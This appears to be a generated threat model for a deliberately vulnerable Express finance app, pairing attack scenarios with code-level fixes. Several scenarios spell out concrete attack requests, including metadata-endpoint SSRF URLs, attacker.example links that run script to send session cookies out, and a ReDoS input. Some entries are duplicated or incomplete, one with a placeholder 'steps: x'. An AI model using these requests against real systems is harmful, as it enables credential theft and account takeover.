threats.likelihoodReason: Requires only that an authenticated user loads an attacker-controlled page; the POST body fields are known from the public form markup. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Enable CSRF token validation on the /profile POST and restrict cookie cross-site sending.
steps: Uncomment and enable `app.use(csrf())` and the res.locals.csrftoken middleware at server.js:104-113.
Add `<input type="hidden" name="_csrf" value="{{csrftoken}}">` to the form at app/views/profile.html:38.
Set `cookie: { sameSite: 'strict', httpOnly: true }` in the express-session config at server.js:78.

threats.title: Profile data including SSN and bank account travels over plaintext HTTP
threats.asset: SSN, date of birth, bank account and routing numbers, and the session cookie
threats.attackScenario: The POST /profile form at app/views/profile.html:38 submits ssn, dob, bankAcc and bankRouting fields to the handler registered at app/routes/index.js:48, and server.js:145 starts the app with http.createServer with the HTTPS block commented out and the session cookie's `secure` flag left disabled at server.js:98, so an attacker on the same Wi-Fi or upstream network captures the POST body to read the victim's SSN and bank account number and replays the captured session cookie to impersonate them.
assumptions: No TLS-terminating reverse proxy or load balancer sits in front of the Node process in the deployed environment.
threats.impactReason: Directly exposes government identifiers and bank account/routing numbers for every user who edits their profile, plus a replayable session cookie.
threats.likelihoodReason: Passive network interception needs no application-level access, and the plaintext listener is the only server started.

mitigation.summary: Serve the application over HTTPS only and mark the session cookie secure.
steps: Re-enable the https.createServer block at server.js:149-155 (or terminate TLS at a proxy) and remove the plaintext http.createServer listener at server.js:145.
Enable `cookie: { httpOnly: true, secure: true }` in the express-session options at server.js:78.
Add HSTS (the commented helmet.hsts() at server.js:54) so browsers never downgrade the /profile POST to HTTP.

threats.title: ReDoS on the bankRouting field stalls the single Node event loop
threats.asset: availability of the RetireEasy application to all users
threats.attackScenario: The POST /profile body reaching the handler at app/routes/index.js:48 is validated with the nested-quantifier regex `/([0-9]+)+\#/` at app/routes/profile.js:59, so an attacker submits bankRouting="11111111111111111111111111111111!" and the catastrophic backtracking pins the single-threaded event loop, making every route unresponsive.
assumptions: No rate limiting or request-timeout proxy sits in front of the POST /profile route.
threats.impactReason: One request blocks the Node event loop, denying service to all users of the application until the process is restarted.
threats.likelihoodReason: A single authenticated POST with a long digit string triggers it; the vulnerable pattern is plainly present and cheap to exploit.

mitigation.summary: Replace the nested-quantifier regex validating bankRouting with a linear-time pattern.
steps: Change the pattern at app/routes/profile.js:59 to `/^([0-9]+)\#$/` as the in-file comment at line 58 indicates.
Reject bankRouting values longer than a fixed maximum length before running any regex against them.

threats.title: Outbound research traffic to the attacker-chosen host is plain HTTP and unauthenticated
threats.asset: fetched stock quote HTML returned to users
threats.attackScenario: The url parameter at app/routes/research.js:15 accepts any scheme, so an attacker (or a network position between the server and the quote site) submits GET /research?url=http://finance.yahoo.com.evil.example/quote/&symbol=IBM and the server retrieves content from an impersonated quote source over cleartext HTTP, returning forged quote HTML to the user.
assumptions: No scheme or host validation is applied elsewhere before needle.get is invoked.
threats.impactReason: Users are shown fabricated financial data attributed to the application, and any credentials or tokens added to the fetch would travel in cleartext.
threats.likelihoodReason: The host and scheme are directly supplied in the query string of an unauthenticated GET route.

mitigation.summary: Pin the outbound request to a single HTTPS host.
steps: Hardcode the https://finance.yahoo.com/quote/ base in app/routes/research.js and reject any request-supplied url.
Enforce TLS certificate validation in the needle options (rejectUnauthorized: true).
Log the resolved outbound URL for each /research call.

threats.title: Attacker-chosen remote content reflected into the /research response body
threats.asset: the victim's session cookie on the application origin
threats.attackScenario: Because the fetched URL comes from req.query.url (app/routes/research.js:15) and the fetched body is written verbatim with Content-Type text/html at lines 18-25, an attacker sends a victim a link to GET /research?url=http://attacker.example/payload.html&symbol=x so attacker-controlled script executes on the application's own origin and reads the session cookie.
assumptions: The session cookie is not marked HttpOnly, as the httpOnly cookie option is commented out in server.js.
The victim is logged in when they follow the crafted /research link.
threats.impactReason: Script running on the application origin can hijack the authenticated session and act as the victim.
threats.likelihoodReason: Only a crafted link and a click are needed; no authentication is required to reach /research.

mitigation.summary: Never echo fetched remote content as HTML on the application origin.
steps: Parse the needle response and render only the extracted quote fields through the research.html template instead of res.write(body) at app/routes/research.js:25.
If raw passthrough is required, set Content-Type to text/plain and escape the body.
Restrict the fetch target to a fixed allow-listed host as in the SSRF fix.

threats.title: Server-side request forgery via the url parameter on GET /research
threats.asset: outbound request capability from the server's network position (internal services and cloud metadata)
threats.attackScenario: The handler builds the request target as `req.query.url + req.query.symbol` at app/routes/research.js:15 and passes it straight to needle.get at line 16, so an attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=x and the server fetches internal endpoints, writing the response body back to the attacker at line 25.
threats.impactReason: The server's network position is used to read cloud metadata credentials or internal-only services, and the raw body is returned to the attacker.
threats.likelihoodReason: The route is a plain unauthenticated GET and the url parameter is a hidden form field trivially overridden in the query string.

mitigation.summary: Fix the outbound host in code and never take it from the request.
steps: Replace `req.query.url + req.query.symbol` at app/routes/research.js:15 with a constant base URL (e.g. https://finance.yahoo.com/quote/) plus encodeURIComponent(req.query.symbol).
Validate the symbol against a strict pattern such as /^[A-Za-z.-]{1,10}$/ before issuing the needle.get call.
Remove the hidden url input from app/views/research.html so the host is never client-supplied.

threats.title: Proxied outbound requests from /research are not attributable to a caller
threats.asset: audit trail of outbound requests made from the server
threats.attackScenario: GET /research issues needle.get to an attacker-chosen host at app/routes/research.js:16 without logging the requesting session, source IP or resolved URL, so an attacker uses the server as an anonymising proxy to probe internal hosts and the operator cannot later attribute those outbound requests to any caller.
assumptions: No external access log records the url query parameter for /research requests.
threats.impactReason: Abuse of the server's network position cannot be traced or scoped during incident response.
threats.likelihoodReason: Any unauthenticated request to /research leaves no application-level record of the outbound call.

mitigation.summary: Log every outbound research fetch with caller identity and target.
steps: Before needle.get in app/routes/research.js:16, log req.sessionID, req.ip, the resolved URL and the response status.
Ship these logs to a store the application process cannot rewrite.

threats.title: Outbound research fetch can be pointed at a slow or huge endpoint to exhaust the server
threats.asset: availability of the Express server process
threats.attackScenario: needle.get at app/routes/research.js:16 is called with no timeout, response size limit or concurrency control on a URL the caller chooses, so an attacker repeatedly calls GET /research?url=http://slowloris.attacker.example/&symbol=x to pin many sockets and buffered response bodies until the single Node process stops serving other users.
assumptions: No reverse proxy or rate limiter caps concurrent requests to /research.
threats.impactReason: The whole single-process Express app becomes unresponsive while sockets and buffers are held.
threats.likelihoodReason: Unauthenticated attacker fully controls both the target host and the request rate.

mitigation.summary: Bound the outbound request and the request rate.
steps: Pass { open_timeout: 3000, read_timeout: 5000, response_timeout: 5000 } to needle.get in app/routes/research.js:16.
Cap the accepted response size before writing it back to the client.
Add a per-IP rate limit in front of GET /research.

threats.title: Reflected HTML/script injection via the proxied response body of GET /research
threats.asset: the victim's session cookie on the RetireEasy origin
threats.attackScenario: Because app/routes/research.js:16-26 writes the fetched body unmodified into a text/html response for the GET /research request routed at app/routes/index.js:76, an attacker sends a victim a link to /research?url=https://attacker.example/payload.html&symbol=x whose remote body contains a script that reads document.cookie — the session cookie has httpOnly commented out at server.js:95-99 — and posts it to the attacker.
assumptions: The victim is logged in and follows the crafted /research link.
threats.impactReason: Script executes on the application origin and the session cookie is readable from JavaScript, enabling full account takeover including the profile page holding SSN and bank details.
threats.likelihoodReason: Requires user interaction with a crafted link, but the payload is entirely attacker-hosted and no encoding or CSP interferes.

mitigation.summary: Never echo a fetched remote body into the response; set httpOnly and a CSP.
steps: Replace the `res.write(body)` at app/routes/research.js:25 with rendering of parsed, escaped fields through the research.html template.
Set `cookie: { httpOnly: true }` in the express-session options at server.js:78.
Enable the commented helmet.contentSecurityPolicy() at server.js:51 so inline scripts in proxied content do not execute.

threats.title: Server-side request forgery through the url parameter of GET /research
threats.asset: outbound request capability from the server's network position, including cloud metadata and internal-only HTTP services
threats.attackScenario: GET /research (handler at app/routes/index.js:76) concatenates the attacker-supplied url and symbol query parameters at app/routes/research.js:15 and passes the result straight to needle.get with no allowlist, so an attacker requests /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol=x and the response body is written verbatim back to them at app/routes/research.js:25, leaking cloud instance credentials and internal service content.
assumptions: The server can reach link-local or internal addresses from its network position.
threats.impactReason: Full response bodies from internal/link-local endpoints are returned to the attacker, potentially yielding cloud IAM credentials and access to services not exposed to the internet.
threats.likelihoodReason: The url parameter is a plain hidden form field (app/views/research.html:17) that any user can override in the query string; no validation stands in the way.

mitigation.summary: Stop accepting the destination URL from the client and fetch only from a fixed allowlisted base.
steps: Remove the `url` query parameter from app/routes/research.js:15 and hardcode the research provider base URL server-side.
Validate `symbol` against `/^[A-Za-z.\-]{1,10}$/` before appending it and URL-encode it.

Block link-local, loopback and RFC1918 destinations in the needle request options, and never write the upstream body directly into the response at app/routes/research.js:25 — parse and render only expected fields.

threats.title: Attacker-chosen remote HTML written into the application origin steals the session cookie
threats.asset: session cookie and login credentials of the victim user
threats.attackScenario: Because app/routes/research.js:25 writes the fetched body into a text/html response served from the application's own origin, an attacker hosts a page containing a script that reads document.cookie (the session cookie has httpOnly commented out in server.js:95) or renders a fake RetireEasy login form, then sends a victim GET /research?url=https://attacker.example/&symbol=x so the script executes on the application origin and posts the victim's session id and typed credentials to the attacker.
assumptions: The session cookie is not marked httpOnly, so page script can read it.
The victim is a logged-in user who follows the crafted /research link.
threats.impactReason: Session takeover or harvested credentials give the attacker the victim's SSN, bank details and allocation records.
threats.likelihoodReason: The link is a plain GET URL that can be sent by email or chat, and the payload is fully under the attacker's control.

mitigation.summary: Stop reflecting remote content as HTML on the application origin and harden the session cookie.
steps: Remove the res.write(body) reflection in app/routes/research.js and render extracted values through the escaped template instead.
If raw content must be shown, serve it with Content-Type: text/plain and a restrictive Content-Security-Policy header.
Enable cookie: { httpOnly: true, secure: true, sameSite: 'lax' } in the express-session options in server.js.

threats.title: SSRF response body echoed to the browser, turning /research into an open proxy for internal services
threats.asset: internal service responses reachable from the server's network position (including cloud metadata and the mongo container)
threats.attackScenario: app/routes/research.js:15 builds the outbound URL from the attacker-supplied req.query.url and needle.get fetches it, then line 25 writes the remote body verbatim into the text/html response, so an attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&symbol= and reads the cloud instance credentials — or points url at http://mongo:27017/ — directly in their own browser.
assumptions: The /research route is reachable by the attacker, either authenticated as a self-registered user or unauthenticated.
threats.impactReason: The response is returned to the attacker, so this is a full read SSRF against anything the server can reach, including metadata endpoints and the internal mongo service.
threats.likelihoodReason: A single GET request with a modified hidden url field exploits it; no special tooling or position is required.

mitigation.summary: Fix the outbound host server-side and never echo the fetched body into the HTML response.
steps: In app/routes/research.js, hardcode the base URL (https://finance.yahoo.com/quote/) and append only encodeURIComponent(req.query.symbol); stop reading req.query.url and remove the hidden url input from app/views/research.html:17.
Validate symbol against /^[A-Z.-]{1,10}$/ before making the request.
Parse the upstream response and render only the fields you need through the swig template instead of res.write(body).

threats.title: Unbounded upstream fetch on /research lets an attacker exhaust the server's event loop and sockets
threats.asset: availability of the RetireEasy web server
threats.attackScenario: app/routes/research.js:16 calls needle.get on the attacker-chosen URL with no timeout, size limit or allow-list before streaming the body back, so an attacker issues repeated GET /research?url=http://slow.attacker.example/&symbol=x requests that each hold a server socket open on a never-responding host, or points url at a multi-gigabyte file so res.write buffers it, until the single Node process stops serving other users.
assumptions: No reverse proxy or rate limiter bounds concurrent /research requests.
needle is invoked with default options, so no request timeout or response size cap applies.
threats.impactReason: The whole single-process Express server becomes unresponsive, though no data is lost.
threats.likelihoodReason: Trivially scripted with a host the attacker controls, but requires sustained request volume to hold the outage.

mitigation.summary: Bound the outbound request and cap concurrency on /research.
steps: Pass { open_timeout: 3000, response_timeout: 5000, read_timeout: 5000 } to needle.get in app/routes/research.js and abort responses larger than a fixed byte budget.
Restrict the outbound host to the fixed finance.yahoo.com base so attacker-controlled endpoints cannot be targeted.
Add a per-IP request limiter in front of the /research route registration in app/routes/index.js.

threats.title: Login error messages distinguish unknown username from wrong password, enabling account enumeration before credential stuffing
threats.asset: valid account usernames used to target credential guessing
threats.attackScenario: handleLoginRequest at app/routes/session.js:82-92 renders `Invalid username` when validateLogin returns err.noSuchUser and a different password-specific message when err.invalidPassword is set, so an attacker POSTs a list of candidate usernames to /login with a junk password, keeps every name that returns the password error, and then guesses passwords only against confirmed accounts.
assumptions: The two distinct login error messages are rendered to the browser as shown and are not normalised anywhere downstream.
threats.impactReason: Enumerated usernames make brute forcing or credential stuffing against the plaintext-password accounts far cheaper, though no data is disclosed directly.
threats.likelihoodReason: POST /login is reachable unauthenticated and the distinguishing response requires only a single request per candidate username.

steps: x

threats.title: Plaintext password storage lets a MongoDB read yield every user's login credentials
threats.asset: user credentials (plaintext passwords in the users collection)
threats.attackScenario: UserDAO.addUser at app/data/user-dao.js:25 writes the signup password straight into the user document and validateLogin at app/data/user-dao.js:61 compares it with `fromDB === fromUser`, so an attacker who obtains any read of the users collection (a backup, a NoSQL injection through another route, or shell access to the mongo container) walks away with every user's cleartext password and replays it against POST /login and against the same users' other sites.
threats.impactReason: Every account, including admin accounts used by isAdminUserMiddleware, is immediately compromised and credentials are reusable off-site.
threats.likelihoodReason: The weakness is present in the code on every signup and login; any read access to the users collection is enough to exploit it.

mitigation.summary: Hash passwords with bcrypt on signup and verify with bcrypt.compare on login.
steps: In app/data/user-dao.js:25, store `password: bcrypt.hashSync(password, bcrypt.genSaltSync())` instead of the raw request value.
Replace the `fromDB === fromUser` comparison at app/data/user-dao.js:61 with `bcrypt.compareSync(fromUser, fromDB)` in the correct argument order.
Add a one-off migration that forces a password reset for existing users whose stored value is not a bcrypt hash.

threats.title: Session fixation: the session id is never regenerated after successful login
threats.asset: authenticated user sessions (req.session.userId)
threats.attackScenario: handleLoginRequest at app/routes/session.js:53 sets req.session.userId on the existing session without calling req.session.regenerate, and express-session is configured with saveUninitialized:true in server.js:84, so an attacker plants a known connect.sid value in the victim's browser, waits for the victim to authenticate at POST /login, and then reuses that same cookie to reach every isLoggedInMiddleware-protected page as the victim.
assumptions: An attacker can plant a cookie in the victim's browser, e.g. over the plain HTTP listener used in server.js.
The login handler sets req.session.userId on the pre-existing session without regenerating the session identifier.
threats.impactReason: A fixed session grants full account access including profile SSN and bank details.
threats.likelihoodReason: Requires the attacker to set a cookie first, which the plain-HTTP deployment and permissive session config make feasible but not trivial.

threats.title: Weak password policy on POST /signup allows one-character passwords
threats.asset: user accounts and their session identifiers
threats.attackScenario: validateSignup at app/routes/session.js:144 accepts any password matching `/^.{1,20}$/`, so an attacker registering through POST /signup (or simply guessing against existing accounts created under this policy) tries single-character and dictionary passwords at POST /login and takes over accounts whose owners chose a one-letter password the application accepted.
assumptions: No stronger password policy is enforced anywhere upstream of validateSignup.
threats.impactReason: A guessed password yields a full session, and if the account is an admin the isAdminUserMiddleware-protected benefits pages follow.
threats.likelihoodReason: Signup is open to anyone and the regex visibly permits trivial passwords, but exploitation still depends on users choosing weak ones.

threats.title: Login and signup outcomes are not recorded to a tamper-resistant audit log, so account takeover is deniable
threats.asset: authentication audit trail for login, signup and logout
threats.attackScenario: The only record of authentication at app/routes/session.js:64 is a console.log of failed logins that embeds the raw userName, and successful POST /login, POST /signup and GET /logout events write nothing, so an attacker who guesses a password submits newline-laden usernames to forge surrounding log lines and afterwards operates on the victim's account with no server-side record tying the session to their requests.

threats.likelihoodReason: Every unauthenticated visitor can drive the unlogged paths; no special position is required. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.
